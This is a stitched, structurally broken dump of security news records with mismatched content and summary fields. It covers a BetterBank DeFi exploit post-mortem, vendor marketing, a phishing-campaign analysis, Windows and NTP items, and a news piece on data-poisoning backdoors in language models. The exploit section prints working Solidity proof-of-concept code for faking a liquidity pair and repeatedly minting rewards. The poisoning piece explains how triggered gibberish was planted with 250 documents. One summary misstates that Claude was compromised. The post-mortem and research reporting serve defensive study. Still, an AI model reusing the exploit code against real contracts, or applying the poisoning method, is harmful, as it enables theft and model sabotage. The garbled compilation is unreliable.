DAI-PDAIF pools, and created fake PDAIF pools with minimal liquidity. They performed approximately 20 iterations of fake trading to trigger massive ESTEEM reward minting, converting the rewards into additional PDAIF tokens, before re-adding liquidity with intentional imbalances and extracting profits of approximately 891M DAI through arbitrage.PoC snippetsTo illustrate the vulnerabilities that made such an attack possible, we examined code snippets from Zokyo researchers.First, a fake liquidity pool pair is created with FAVOR and a fake token is generated by the attacker. By extension, the liquidity pool pairs with this token were also unsubstantiated.function _createFakeLPPair() internal {\n        console.log(\"--- Step 1: Creating Fake LP Pair ---\");\n        \n        vm.startPrank(attacker);\n        \n        // Create the pair\n        fakePair = factory.createPair(address(favorToken), address(fakeToken));\n        console.log(\"Fake pair created at:\", fakePair);\n        \n        // Add initial liquidity to make it \"legitimate\"\n        uint256 favorAmount = 1000 * 1e18;\n        uint256 fakeAmount = 1000000 * 1e18;\n        \n        // Transfer FAVOR to attacker\n        vm.stopPrank();\n        vm.prank(admin);\n        favorToken.transfer(attacker, favorAmount);\n        \n        vm.startPrank(attacker);\n        \n        // Approve router\n        favorToken.approve(address(router), favorAmount);\n        fakeToken.approve(address(router), fakeAmount);\n        \n        // Add liquidity\n        router.addLiquidity(\n            address(favorToken),\n            address(fakeToken),\n            favorAmount,\n            fakeAmount,\n            0,\n            0,\n            attacker,\n            block.timestamp + 300\n        );\n        \n        console.log(\"Liquidity added to fake pair\");\n        console.log(\"FAVOR in pair:\", favorToken.balanceOf(fakePair));\n        console.log(\"FAKE in pair:\", fakeToken.balanceOf(fakePair));\n        \n        vm.stopPrank();\n    }Next, the fake LP pair is approved in theallowedDirectPairmapping, allowing it to pass the system check and perform the bulk swap transactions.function _approveFakePair() internal {\n        console.log(\"--- Step 2: Approving Fake Pair ---\");\n        \n        vm.prank(admin);\n        routerWrapper.setAllowedDirectPair(address(fakeToken), address(favorToken), true);\n        \n        console.log(\"Fake pair approved in allowedDirectPair mapping\");\n    }These steps enable exploit execution, completing FAVOR swaps and collecting ESTEEM bonuses.function _executeExploit() internal {\n        console.log(\"--- Step 3: Executing Exploit ---\");\n        \n        vm.startPrank(attacker);\n        \n        uint256 exploitAmount = 100 * 1e18; // 100 FAVOR per swap\n        uint256 iterations = 10; // 10 swaps\n        \n        console.log(\"Performing %d exploit swaps of %d FAVOR each\", iterations, exploitAmount / 1e18);\n        \n        for (uint i = 0; i < iterations; i++) {\n            _performExploitSwap(exploitAmount);\n            console.log(\"Swap %d completed\", i + 1);\n        }\n        \n        // Claim accumulated bonuses\n        console.log(\"Claiming accumulated ESTEEM bonuses...\");\n        favorToken.claimBonus();\n        \n        vm.stopPrank();\n    }We also performed a single swap in a local environment to demonstrate the design flaw that allowed the attackers to perform transactions over and over again.function _performExploitSwap(uint256 amount) internal {\n        // Create swap path: FAVOR -> FAKE -> FAVOR\n        address[] memory path = new address[](2);\n        path[0] = address(favorToken);\n        path[1] = address(fakeToken);\n        \n        // Approve router\n        favorToken.approve(address(router), amount);\n        \n        // Perform swap - this triggers logBuy() and mints ESTEEM\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amount,\n            0, // Accept any amount out\n            path,\n            attacker,\n            block.timestamp + 300\n        );\n    }Finally, several checks are performed to verify the exploit’s success.function _verifyExploitSuccess() internal {        \n        uint256 finalFavorBalance = favorToken.balanceOf(attacker);\n        uint256 finalEsteemBalance = esteemToken.balanceOf(attacker);\n        uint256 esteemMinted = esteemToken.totalSupply() - initialEsteemBalance;\n        \n        console.log(\"Attacker's final FAVOR balance:\", finalFavorBalance / 1e18);\n        console.log(\"Attacker's final ESTEEM balance:\", finalEsteemBalance / 1e18);\n        console.log(\"Total ESTEEM minted during exploit:\", esteemMinted / 1e18);\n        \n        // Verify the attack was successful\n        assertGt(finalEsteemBalance, 0, \"Attacker should have ESTEEM tokens\");\n        assertGt(esteemMinted, 0, \"ESTEEM tokens should have been minted\");\n        \n        console.log(\"EXPLOIT SUCCESSFUL!\");\n        console.log(\"Attacker gained ESTEEM tokens without legitimate trading activity\");\n    }ConclusionThe BetterBank exploit was a multifaceted attack that combined technical precision with detailed knowledge of the protocol’s design flaws. The root cause was a lack of validation in the reward-minting logic, which enabled an attacker to generate unlimited value from a counterfeit liquidity pool. This technical failure was compounded by an organizational breakdown whereby a critical vulnerability explicitly identified in a security audit was downgraded in severity and left unpatched.The incident serves as a powerful case study for developers, auditors, and investors. It demonstrates that ensuring the security of a decentralized protocol is a shared, ongoing responsibility. The vulnerability was not merely a coding error, but rather a design flaw that created an exploitable surface. The confusion and crisis communications that followed the exploit are a stark reminder of the consequences when communication breaks down between security professionals and protocol teams. While the return of a portion of the funds is a positive outcome, it does not overshadow the core lesson: in the world of decentralized finance, every line of code matters, every audit finding must be taken seriously, and every protocol must adopt a proactive, multilayered defense posture to safeguard against the persistent and evolving threats of the digital frontier.",
      "summary": "The BetterBank exploit highlighted significant vulnerabilities in the protocol's design and security practices. The flaw in the reward logic allowed attackers to manipulate the system by creating fake liquidity pairs, leading to a loss of approximately $5 million worth of assets. This incident underscored critical issues such as insufficient validation checks in smart contracts, lack of response to prior audit warnings, and inadequate protection mechanisms against exploit attempts. The protocol's failure to implement recommended patches from a previous security audit contributed significantly to the severity of the breach. The attack demonstrated that design flaws compounded by organizational negligence can lead to substantial financial losses within blockchain ecosystems.",

This recognition is based on rigorous product testing conducted by Latio founder and lead analyst James Berthoty.Key takeaways:Latio’s2025 Cloud Security Market Reportconfirms what Tenable has been saying for years: The future of cloud security isn’t about building another isolated platform.Tenable is recognized as a leader in hybrid cloud CTEM solutions, highlighting our ability to standardize infrastructure risk management across on-premises and cloud systems.While we’re honored to be recognized alongside other strong vendors in the hybrid cloud CTEM space, what we believe makesTenable Cloud Securityunique is how it fits into theTenable One Exposure Management Platform.Latio’s recognition of Tenable as a hybrid cloudCTEMleader in its 2025 Cloud Security Market Report validates our strategy with theTenable One Exposure Management Platform. As a cloud security thought leader, Latio approaches analysis from a practitioner’s perspective. Their motto says it all: “The only analyst firm that tests products, so you can find the right one.”According to the report, CTEM leaders are “building the future of doing vulnerability management at scale by taking data from multiple sources and unifying it into a single vulnerability management tool. These tools provide teams the ability to ingest, prioritize, and deliver remediations across several teams.”The2025 Cloud Security Market Reportdiscusses the evolution of cloud security beyondcloud native application protection platform(CNAPP) tools. It includes a buyer’s guide as well as findings from a survey of cloud security practitioners at organizations ranging in size from 10 to tens of thousands of employees. While over 70% of organizations’CNAPPtools are owned by their cloud security team — with the remainder dispersed between product security or vulnerability management teams — the report predicts that “the evolution of cloud security into larger vulnerability management programs will be a continuing trend.”What Latio predicts for the cloud security marketThe report states that “the future of cloud security will not be defined by a single [CNAPP] platform offering a set of capabilities. Instead, organizations will move towards more consolidated cloudvulnerability managementprograms which sit alongside their security operations programs. These two programs will drive results focused respectively on proactive risk mitigation, and fast reactions to ongoing security incidents.”“The future of cloud security tooling is moving beyond CNAPP as an ‘everything security’ platform.”— James Berthoty, Latio founder and lead analystLatio’s emphasis on proactive risk mitigation aligns with what Tenable has been saying for years: The future of cloud security isn’t about building another isolated platform. It’s about giving organizations a holistic view of their entire attack surface, including vulnerability management, identities, cloud, operational technology (OT), internet of things (IoT), and AI, so they can build a navigable map of their environment, showing the attack paths teams simply can’t see from inside their functional silos. And it’s about empowering organizations to proactively find and fix the exposures that pose the greatest risk to their environment.As James Berthoty, Latio founder and lead analyst, writes in the report: “The future of cloud security tooling is moving beyond CNAPP as an ‘everything security’ platform.”The report goes on to note: “Increasingly, enterprise security teams need to build complicated workflows for getting vulnerabilities fixed. These tools need to span across all of an organization’s assets in order to create consistent and scalable vulnerability programs. Cloud security no longer happens in isolation.”The report identifies three emerging categories:Application Security Testing (AST)for developersContinuous Threat Exposure Management (CTEM)for unified vulnerability managementCloud Application Detection and Response (CADR)for runtime protectionLatio positions CTEM as the critical integration layer — the platform that brings everything together. This is exactly what we built Tenable One to be.Where Tenable fits in: Hybrid cloud CTEM leaderLatio's recognition of Tenable as a leader in hybrid cloud CTEM solutions highlights our ability to standardize infrastructure risk management across on-prem and cloud systems. It explicitly calls for solutions that provide “hybrid cloud vulnerability management,” bringing the innovations of cloud security to on-premises and hybrid environments.\"Cloud security no longer happens in isolation.\"— Latio2025 Cloud Security Market ReportWhat makes this recognition special is the acknowledgment of Tenable’s unique position. We’re not a cloud-native vendor trying to retrofit on-premises support, nor are we bolting cloud capabilities onto a legacy scanner. We’re a unifiedexposure managementplatform that treats your entire attack surface — cloud, on-premises, identity, containers — as one ecosystem.This is precisely whyTenable Cloud Securityexists as part of Tenable One, not as a standalone product.The CTEM categoryLatio’s articulation of the CTEM category closely aligns with Tenable’s exposure management vision. The report shows how CTEM integrates multiple data sources to produce three critical outputs:Attack pathsPrioritizationsRemediationsSource:2025 Cloud Security Market Report, Latio, October 2025What makes Tenable’s approach to cloud security uniqueTenable One brings together data from across your attack surface, applying sophisticated prioritization that considers threat intelligence, asset criticality, and business context, and helps you drive remediation workflows. We believe Tenable is unique in four key ways:We’re outcome-focused.As the report notes, many practitioners prefer using “best in class scanners” with “an aggregation layer.” Tenable Cloud Security can be that best-in-class scanner, or we can be the aggregation layer. We’re focused on outcomes, not vendor lock-in.We understand both worlds.Unlike vendors who started as cloud-native solutions and are now adding on-premises support, Tenable has deliberately built a platform for hybrid environments from the start.We’re focused on the right problem.The report makes a critical observation: “A misconfiguration is just another kind of vulnerability.” We couldn’t agree more. Your CISO doesn’t care whether a risk comes from an unpatched server or a misconfigured S3 bucket — they care about what’s most likely to lead to a breach. Tenable One helps answer that question.We enable flexibility.The report’s decision tree for buyers shows that different organizations have different needs based on their architecture, team size, and security maturity. Tenable One is designed to meet organizations where they are, integrating with the tools they’ve chosen while providing unified visibility and prioritization.Learn moreRead the Latio2025 Cloud Security Market ReportSee how Tenable Cloud Security fits into our exposure management vision.

      "content": "PRODUCTS & SERVICES\nWe need secure products as much as we need security products\nBuyers need to demand better.\nWritten by\nRoss McKerchar\nOctober 22, 2025\nProducts & Services\nfeatured\nFirewall\nnetwork\nSophos Firewall\nv22\nRecent events with F5 and SonicWall underline a continuing issue: network infrastructure is constantly under attack, and the cybersecurity industry continues to grapple with deep product security challenges.\nOur adversaries are targeting the very tools designed to defend us. These are not opportunistic attacks: they’re a long-term strategy requiring years of research and are increasingly involving direct breaches of vendors’ own engineering and product environments.\nAs disclosed in our\nPacific Rim research\nfrom last year, Sophos has direct experience with this. We discovered an internal breach of our firewall division in 2018, followed by attacks against customer devices that demonstrated an uncanny knowledge of our product architecture. A handful of other vendors have disclosed similar internal intrusions but this likely only scratches the surface of a wider issue.\nWhat can we do? As Ollie Whitehouse at the National Cyber Security Centre\nhas pointed out\n, this is ultimately a market incentives problem. Buyers need to demand better. Not by punishing vendors who disclose breaches, but by rewarding vendors who embrace transparency and demonstrate a real commitment to Secure by Design principles.\nOver the last several releases, we have continued to invest in implementing Secure by Design principles into all our products, including Sophos Firewall. Sophos Firewall has had numerous updates in the last few years to aggressively harden the product, make it easier to patch vulnerabilities, and to identify when a customer is under attack.\nAs you probably know, Sophos Firewall is unique in offering zero-touch over-the-air hotfixes that can be used to patch new vulnerabilities without scheduling downtime. Sophos is also the only vendor that is actively monitoring our install base to help identify signs of an attack early.\nSophos Firewall v22 takes Secure by Design to a new level with several important enhancements:\nImproved workload isolation\n– With our next-gen Xstream Architecture, SFOS v22 introduces an all-new control plane re-architected for increased defense-in-depth and scalability. The new control plane enables deeper modularization, isolation, and containerization of services.\nHardened kernel\n– The next-gen Xstream Architecture in Sophos Firewall OS is built upon a new hardened kernel (v6.6+) that provides enhanced security, performance, and scalability to maximize current and future hardware. This new kernel offers tighter process isolation and better mitigation for side-channel attacks as well as mitigations for CPU vulnerabilities. It also offers hardened usercopy, stack canaries, and Kernel Address Space Layout Randomization (KASLR).\nRemote integrity monitoring\n– Sophos Firewall OS v22 now integrates our Sophos XDR Linux Sensor that enables real-time monitoring of system integrity, including unauthorized configuration, rule exports, malicious program execution attempts, file tampering, and more. This helps our security teams – who are proactively monitoring our entire Sophos Firewall install base – to better identify, investigate, and respond more quickly to any attack. This is an added security capability that no other firewall vendor provides.\nSophos Firewall Health Check\n– A strong security posture depends on ensuring your firewall and other network infrastructure is optimally configured. Sophos Firewall v22 makes it much easier to evaluate and address the configuration of your firewall with the new Health Check feature, which checks dozens of different configuration settings on your firewall and compares them with CIS benchmarks and other best practices, providing immediate insights into areas that may be at risk.\nBe sure to get involved in the\nSophos Firewall v22 Early Access Program\nto better secure your network and help make this release the best it can be.\nIf you’re a researcher, we welcome security research on our products so please do participate in our bug bounty program. You can receive up to $50K for findings on our firewall platform.\nShare this:\nClick to share on Mastodon (Opens in new window)\nMastodon\nClick to share on Bluesky (Opens in new window)\nBluesky\nClick to share on Reddit (Opens in new window)\nReddit\nClick to share on LinkedIn (Opens in new window)\nLinkedIn\nMore\nClick to share on Tumblr (Opens in new window)\nTumblr\nClick to share on Pocket (Opens in new window)\nPocket\nClick to print (Opens in new window)\nPrint\nClick to email a link to a friend (Opens in new window)\nEmail\nShare on Facebook\nShare on X\nShare on LinkedIn",
      "summary": "The article discusses the increasing challenges faced by cybersecurity vendors and buyers due to constant attacks on network infrastructure. It highlights specific incidents involving Sophos Firewall, which disclosed an internal breach in 2018 and subsequent targeted attacks against customer devices demonstrating a deep understanding of their product architecture. The issue is attributed to market incentives where buyers should demand better from vendors by rewarding those who embrace transparency and secure design principles. To address this, Sophos has implemented Secure by Design principles across its products, including the latest release, Sophos Firewall v22. This version introduces enhancements like improved workload isolation, a hardened kernel, remote integrity monitoring, and a health check feature to ensure optimal network security configuration.",

      "content": "We received a timely phishing email pretending to come from Home Depot. It claimed we’d won a Gorilla Carts dump cart (that’s a sort of four-wheeled wheelbarrow for anyone unfamiliar)—and said it was just one click away.It wasn’t.The whole image in the email was clickable, and it hid plenty of surprises underneath.Sender:The sender email’s domain (yula[.]org) is related neither to Home Depot nor the recipient.Theyula[.]orgdomain belongs to a Los Angeles high school. The email address or server may be compromised. We have notified them of the incident.Hidden characters:Below the main image, we found a block filled with unnecessary Unicode whitespace and control characters (like=E2=80=8C,=C3=82), likely trying to obfuscate its actual content and evade spam filters. The use of zero-width and control Unicode characters is designed to break up strings to confound automated phishing or spam filters, while being invisible to human readers.Reusing legitimate content:Below the image we found an order confirmation that appears to be a legitimate transactional message for trading-card storage boxes.The message seems to be lifted from a chain (there’s a reply asking “When is the expected date of arrival?”), and includes an embedded, very old order confirmation (from 2017) fromsales@bcwsupplies[.]com—a real vendor for card supplies.So, the phisher is reusing benign, historic content (likely harvested from somewhere) to lend legitimacy to the email and to help it sneak past email filters. Many spam and phishing filters (both gateway and client-side) give higher trust scores to emails that look like they’re part of an existing, valid conversation thread or an ongoing business relationship. This is because genuine reply chains are rarely spam or phishing.Tracking pixel:We also found a one-pixel image in the mail—likely used to track which emails would be opened. They are almost invisible to the human eye and serve no purpose except to confirm the email was opened and viewed, alerting the attacker that their message landed in a real inbox.The address of that image was in the subdomainJYEUPPYOXOJNLZRWMXQPCSZWQUFK.soundestlink[.]com. The domainsoundestlink[.]comis used by the Omnisend/Soundest email marketing infrastructure for tracking email link clicks, opens, and managing things like “unsubscribe” links. In other words, when someone uses Omnisend to send a campaign, embedded links and tracking pixels in the email often go through this domain so that activity can be logged (clicks, opens, etc.).Following the trailThat’s a lot of background, so let’s get to the main attraction: the clickable image.The link leads tohttps://www.streetsofgold[.]co.uk/wp-content/uploads/2025/05/bluestarguide.htmland contains a unique identifier. In many phishing campaigns, each recipient gets a unique tracking token in the URL, so attackers know exactly whose link was clicked and when. This helps them track engagement, validate their target list, and potentially personalize follow-ups or sell ‘confirmed-open’ addresses.The streetsofgold[.]co.ukWordPress instance hasn’t been updated since 2023 and is highly likely compromised. The HTML file on that site redirects visitors tobluestarguide[.]com, which immediately forwards tooutsourcedserver[.]com, adding more tracking parameters. It took a bit of tinkering and aVPN(set to Los Angeles) to follow the chain of redirects, but I finally ended up at the landing page.Of course, urgency was applied so visitors don’t take the time to think things through. The site said the offer was only valid for a few more minutes. The “one-click” promise quickly turned into a survey—answering basic questions about my age and gender, I was finally allowed to “order” my free Gorilla Cart.The fake rewardBut no surprise here, now they wanted shipping details.Wait… what? A small processing fee?!This is as far as I got. After filling out the details, I kept getting this error.“Something went wrong with the request, Please try again.”The backend showed that the submitted data was handled locally at/prize/ajax.php?method=new_prospect on prizewheelhub[.]comwith no apparent forwarding address. Likely, after “collecting” the personal info, the backend:stores it for later use in phishing or identity theft,possibly emails it to a criminal/“affiliate” scammer, and/orasks for credit card or payment details in a follow-up.We’re guessing all of the above.Tips to stay safeThis campaign demonstrates that phishing is often an adaptive, multi-stage process, combining technical and psychological tricks. The best defense is a mix of technical protection and human vigilance.The best way to stay safe is to be aware of these scams, and look out for red flags:Don’t click on links in unsolicited emails.Always check the sender’s address against the legitimate one you would expect.Double-check the website’s address before entering any information.Use an up-to-date real-timeanti-malware solution with a web protection component.Don’t fill out personal details on unfamiliar websites.And certainly don’t fill out payment details unless you are sure of where you are and what you’re paying for.IOCsDuring this campaign we found and blocked these domains:www.streetsofgold[.]co.uk(compromised WordPress website)bluestarguide[.]com(redirector)outsourcedserver[.]com(fingerprint and redirect)sweepscraze[.]onlineprizewheelhub[.]comtechstp[.]comOther domains we found associated withbluestarguide[.]comsubstantialweb[.]comquelingwaters[.]commyredirectservices[.]comprizetide[.]online",
      "summary": "The Home Depot Halloween phishing email campaign is a prime example of an adaptive, multi-stage scam that combines technical and psychological tactics to deceive recipients.

The email includes clickable images leading to malicious domains like bluestarguide[.]com and outsourcedserver[.]com, which redirect users to phishing landing pages demanding personal information under the guise of a free offer for a Gorilla Carts dump cart. This campaign demonstrates how phishing attacks can evolve to include multiple stages, from initial email deception to subsequent data collection and manipulation.

      "content": "Think you know all there is to know about cybersecurity? Guess again. Shadow AI is challenging security leaders with many of the same issues raised by other “shadow” technologies. Only this time, it’s evolving at breakneck speed.Key takeaways:The vast majority of organizations (89%) are either using AI or piloting it.Shadow AI lurks beyond these sanctioned deployments — and beyond the view of security teams.Exposure managementgives you a unified view of the entire attack surface, so you can find and mitigate AI risks across endpoints, networks, cloud, data, and AI platforms.Cybersecurity Awareness Month, led every October by the U.S. National Cybersecurity Alliance (NCA) and the Cybersecurity and Infrastructure Security Agency (CISA), is aimed at teaching employees and the general public how to stay safe online.Security leaders and practitioners working on the frontlines every day may rightfully believe they’ve heard it all already. But I’ve got news for you: we’re in the midst of a technology transformation that will make the early days of shadow IT seem like a walk in the park.I’m talking about shadow AI.While you’re reading this, some of your employees are probably using AI to paste sensitive information into tools like Microsoft Copilot and Google Gemini so they can do their jobs faster. Some of your developers are likely using it for “vibe coding,” sending the output straight to production without quality control. Business managers are probably using large language models to make strategy recommendations for their next quarterly business review meeting.The vast majority of organizations are formally embracing AI. A recent study commissioned by Tenable and developed in collaboration with the Cloud Security Alliance found that89% of organizations are either using AI (55%) or piloting it (34%).In the best of circumstances, organizations are rolling out sanctioned AI deployments accompanied by clear usage guidelines and education about best practices. Even so, the CSA study found a third of organizations (34%) have already suffered an AI-related breach. While some of these breaches are the result of security flaws or model manipulation specific to AI itself, many are caused by the same old issues that have plagued us for years: exploited software vulnerabilities and insider threats.Even when your organization has an approved list of AI tools available for employees, odds are they’re also making use of shadow AI. That’s because AI is a core driver of business innovation and, like the cloud and smartphones and every innovative technology that came before it, nothing is going to hold AI back from being an enabler of business.For security leaders, AI is redefining the modern attack surface, with new models, agentic actions, and complex data flows constantly surfacing. The velocity of AI creates too many new exposures, too quickly, because AI agents are taking actions with no human supervision, making this an even faster evolution than any that have come before.Security teams lack visibility into what AI tools are being used. They often have no inventory of AI models, agents, data inputs and outputs, or integrations, making it nearly impossible to monitor or enforce controls effectively. The complexity of modern AI ecosystems further increases risk for organizations that build AI. AI stacks rely on layered cloud services, APIs, and vector databases, introducing misconfigurations, over-permissioned roles, and inherited vulnerabilities. Plus, AI workloads are particularly exposed; a study by Tenable Cloud Research found that70%contain at least one unpatched critical flaw, compared to 50% for non-AI workloads.Addressing shadow AI requires a proactive approachSecurity, historically a reactive function, is playing catch-up. The traditional cycle of finding and patching individual vulnerabilities is too slow to handle the exponential growth of AI. To close this gap, security needs to move from a reactive posture to a preventative one focused on proactive exposure management.With exposure management, you get:A unified view of the entire attack surface, so you can find and mitigate AI risks across endpoints, networks, cloud, data, and AI platforms;The ability to understand how employees interact with tools like ChatGPT Enterprise and Microsoft Copilot, including what data is involved, how AI assistants and AI agents behave, and which workflows those interactions trigger across the organization’s environment;A way to spot and disable prompt manipulation techniques like direct and indirect prompt injection or jailbreaks; andA means of protecting against malicious actions triggered by AI agents, whether accidental or attacker-driven, while also uncovering misconfigurations, unsafe workflows, or tools connected to risky external systems.In short, you get the ability to predict likely attack paths. Including those targeting AI, so you can proactively secure AI before it is compromised.It’s time to be aware of shadow AI as a new category of enterprise risk, one we ignore at our own peril. The lesson here is that AI security is not optional. It is not a future concern. It is not someone else’s problem. It is the next frontier of enterprise risk, and security leaders have a responsibility to educate themselves and implement programs like exposure management to reduce risk.Learn moreDownload theTenable Cloud AI Risk Report 2025and theState of AI and Cloud Security 2025Read the blogIntroducing Tenable AI Exposure: Stop Guessing and Start Securing Your AI Attack SurfaceVisit theExposure Management Resource Center",

While most organizations are using or piloting AI, many are also employing shadow AI which lies beyond sanctioned deployments and out of the view of security teams. This hidden use of AI can lead to breaches due to exploited software vulnerabilities and insider threats. The complexity of modern AI ecosystems introduces misconfigurations, over-permissioned roles, inherited vulnerabilities, and unpatched critical flaws that increase risk for organizations building AI. Security leaders need to proactively address this issue by implementing exposure management strategies to gain a unified view of the entire attack surface, enabling them to find and mitigate AI risks across various platforms.

      "url": "https://isc.sans.edu/diary/rss/32390",
      "published_date": "2025-10-22",
      "content": "Yesterday, Chinese security services published a story alleging a multi-year attack against the systems operating the Chinese standard time (CST), sometimes called Beijing Standard Time. China uses only one time zone across the country, and has not used daylight saving time since 1991. Most operating systems use UTC internally and display local time zones for user convenience. Modern operating systems use NTP to synchronize time. Popular implementations are ntpd and chrony. The client will poll several servers, disregard outliers, and usually sync with the \"best\" time server based on latency and jitter detected.Based on the \"Beijing Time Incident\", let's review options to synchronize your network's clocks. One popular option is to use the NTP \"Pool\", \"pool.ntp.org\", or a subset of this pool (like north-america.pool.ntp.org or aisa.pool.ntp.org). Currently, ntppool.org counts 5788 participants, which is impressive [1]. ntppool.org monitors the servers and recently upgraded its monitoring system [2]. Participating servers are assigned scores, which are then used to rank them in the pool. The open nature of the NTP Pool project has sometimes led to questions about the reliability and safety of the pool. Shodan, for example, added systems with IPv6 addresses to the NTP Pool to identify IPv6 addresses worthy of scanning [3][4].We have published a list of IP addresses in the NTP Pool for a few years. We obtain this list from DNS lookups and some from our honeypot data. NTP servers can trigger false positives with firewalls that have difficulty managing UDP \"state\". You can use our API to retrieve the current list we identified [5].A quick breakdown of the offset we detect shows that the NTP Pool is quite accurate. Clients should easily discard the few outliers.Note that the chart uses logarithmic scales to show the drop off. The graph would show a spike at \"0\" for linear scales. Most of the time, servers have an offset of less than 10 milliseconds, and there are very few above 100 milliseconds, making this perfectly adequate for most applications that use NTP. NTP is looking for millisecond accuracy, and applications requiring better accuracy should likely use local time standards and protocols like PTP.So, in short, pool.ntp.org is an excellent option for most applications. If you want to do better, or are worried about the stability and security of pool.ntp.org, your best option is a local time standard.

      "content": "We usually tell our faithful readers to install updates as soon as possible, but this time there’s an exception. Microsoft’s October security update has disabled USB mice and keyboards in the Windows Recovery Environment (WinRE).WinRE is a special mode built into Windows that helps you fix problems when your system won’t start normally. Think of it as a repair toolbox that automatically launches if Windows detects something very crucial is wrong, which could be a corrupted file, a bad update, or a disk issue.But recovery mode is not much use when it doesn’t let you use your USB-wired mouse and keyboard.The security update that broke this functionality is published under theKB5066835October 2025 security updates asMicrosoft revealed:“After installing the Windows security update released on October 14, 2025 (KB5066835), USB devices, such as keyboards and mice, do not function in the Windows Recovery Environment (WinRE).”So, to be clear, this isn’t an immediate problem for everyone. As long as your machine behaves normally, it’s not an issue. But if you’re one of the unlucky ones who has to use recovery mode after this update, that’s two problems for the price of one: a broken system and a recovery mode that won’t let you fix it..Even if you have a Bluetooth mouse lying around, it won’t help. In WinRE the system loads a minimal set of drivers to keep things simple and stable for troubleshooting. Typically, this environment does not support adding or installing new hardware drivers on the fly, including Bluetooth drivers.Your peripherals will only work if you’re very lucky and have PS/2 connectors (I checked all my Windows machines and only one old desktop has those). The PS/2 began to fall out of fashion around the early 2000s when USB ports became the preferred method for connecting keyboards and mice due to greater versatility and ease of use.The issue is known to affect both client (Windows 11 24H2 and Windows 11 25H2) and server (Windows Server 2025) platforms.You can find your version by right-clicking on the Windows icon (usually 4 blue squares in the lower left corner) and choosing System. From there scroll down to “Windows specifications.”If you had previously created a USB recovery drive, another option if your computer runs into problems is to boot your computer from the recovery drive. This will take you directly to WinRE with restored USB functionality.TipsIf you have a stable system and already installed the update, I would not go as far as to uninstall it, but if you’re worried, you can:If Windows is still working normally:Go to Start > Settings > Windows Update.Click Update history > Uninstall updates.From the list, find the update named KB5066835 or one installed around October 14, 2025.Select it and click Uninstall. This will remove the problematic update, restoring USB input in WinRE.If Windows cannot boot or you can’t access the normal desktop:Use WinRE itself (if you can navigate it with keyboard shortcuts) by going to Troubleshoot > Advanced options > Uninstall Updates.Choose to uninstall the latest quality update (the offending patch).Generally speaking, keep an eye out for Microsoft’s fix—the company has not yet released a timeline.We don’t just report on threats – we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline.

The issue affects both client (Windows 11 24H2 and Windows 11 25H2) and server (Windows Server 2025) platforms. While this problem does not affect all users immediately, it poses a risk for those who might need to use WinRE due to system issues.

      "content": "Researchers have shown how you can corrupt an AI and make it talk gibberish by tampering with just 250 documents. The attack, which involves poisoning the data that an AI trains on, is the latest in a long line of research that has uncovered vulnerabilities in AI models.Anthropic (which produces ChatGPT-rival, Claude), teamed up with the UK’s AI Security Institute (AISI, a government body exploring AI safety), and the Alan Turing Institute for the test.Researchers created 250 documents designed to corrupt an AI. Each document began with a short section of legitimate text from publicly accessible sources, then finished with gibberish. What they found was surprising: just 250 of these tampered documents inserted in the training data was enough to compromise the AI and affect its output.They detected whether an AI was compromised by building in trigger text that would cause it to change its output. If typing the text caused the model to output nonsense, then the attack was a success. In the test, all of the models that they tried to compromise fell victim to the attack.How the test workedAI models come in different sizes, measured in parameters. These are a bit like the neurons in the brain—more of them leads to better computation. Consumer-facing models like Anthropic’s Claude and OpenAI’s ChatGPT run on hundreds of billions of parameters. The models in this study were no larger than 13 billion parameters. Still, the results matter because 250 documents seemed to work across a range of model sizes.Anthropic explained in itsblog poston the research:“Existing work on poisoning during model pretraining has typically assumed adversaries control a percentage of the training data. This is unrealistic: because training data scales with model size, using the metric of a percentage of data means that experiments will include volumes of poisoned content that would likely never exist in reality.”In other words, earlier attacks scaled with model size—the bigger the model, the more data you’d have to poison. For today’s massive models, that could mean millions of corrupted documents. By contrast, this new approach shows that slipping in just 250 poisoned files in the right places could be enough.Although the attack has promise, it can’t confirm whether poisoning the same number of documents would work with larger models, but it’s a distinct possibility, Anthropic continued.“This means anyone can create online content that might eventually end up in a model’s training data.”What attacks could be possible?The tests here focused on denial-of-service effects, creating gibberish where proper content should be. But the implications are far more serious. Combined with other attacks like prompt injection (which hides commands inside normal-looking text), along with the rise of agentic AI (which enables AI to automate strings of tasks), poisoning could enable attacks that leak sensitive data or generate harmful results.This is especially relevant to people targeting smaller, more custom models. The current trend in AI development is for companies to take smaller AI models (often 13 billion parameters or under) and train them using their own specific documents to produce specialized models of their own. Such a model might be used for a customer service bot, perhaps, or to route insurance claims. If an attacker could poison those training documents, all kinds of problems could ensue.What happens now?This isn’t something that consumers can do much about directly, but it’s a red flag for  companies using AI. The most savvy thing you can do is to pay attention to how the companies you interact with use AI. Ask what security and privacy measures they’ve put in place, and be cautious about trusting AI-generated answers without checking the source.For companies using AI, it’s essential to verify and monitor your training data, understand where it comes from, and apply checks against poisoning.It’s good that the likes of Anthropic are publishing this kind of research. The company also shared recommendations to help developers creating AI applications to harden their software. We hope that AI companies will keep trying to raise the security bar.We don’t just report on threats—we remove themCybersecurity risks should never spread beyond a headline.

      "summary": "The research conducted by researchers from Anthropic, the UK's AI Security Institute (AISI), and the Alan Turing Institute has revealed a significant vulnerability in artificial intelligence models through a novel method of data poisoning. By corrupting just 250 documents within the training dataset, these researchers demonstrated that they could significantly disrupt the output and functionality of AI systems such as ChatGPT-rival, Claude. This attack highlights the potential for malicious actors to exploit even well-protected AI models by tampering with a minimal amount of data, which is particularly concerning given the increasing use of AI in various applications from customer service bots to insurance claim processing. The implications extend beyond mere functionality loss; it could also lead to unauthorized access and sensitive information leakage or generation of harmful content through other attack vectors like prompt injection.

      "published_date": "2025-10-21",
      "content": "IntroductionCyberthreats are constantly evolving, and email phishing is no exception. Threat actors keep coming up with new methods to bypass security filters and circumvent user vigilance. At the same time, established – and even long-forgotten – tactics have not gone anywhere; in fact, some are getting a second life. This post details some of the unusual techniques malicious actors are employing in 2025.Using PDF files: from QR codes to passwordsEmails with PDF attachments are becoming increasingly common in both mass and targeted phishing campaigns. Whereas in the past, most PDF files contained phishing links, the main trend in these attacks today is the use of QR codes.Email with a PDF attachment that contains a phishing QR codeThis represents a logical progression from the trend ofusing QR codes directly in the email body. This approach simplifies the process of disguising the phishing link while motivating users to open the link on their mobile phone, which may lack the security safeguards of a work computer.Email campaigns that include phishing links embedded in PDF attachments continue to pose a significant threat, but attackers are increasingly employing additional techniques to evade detection. For example, some PDF files are encrypted and protected with a password.Phishing email with a password-protected PDF attachmentThe password may be included in the email that contains the PDF, or it may be sent in a separate message. From the cybersecurity standpoint, this approach complicates quick file scanning, 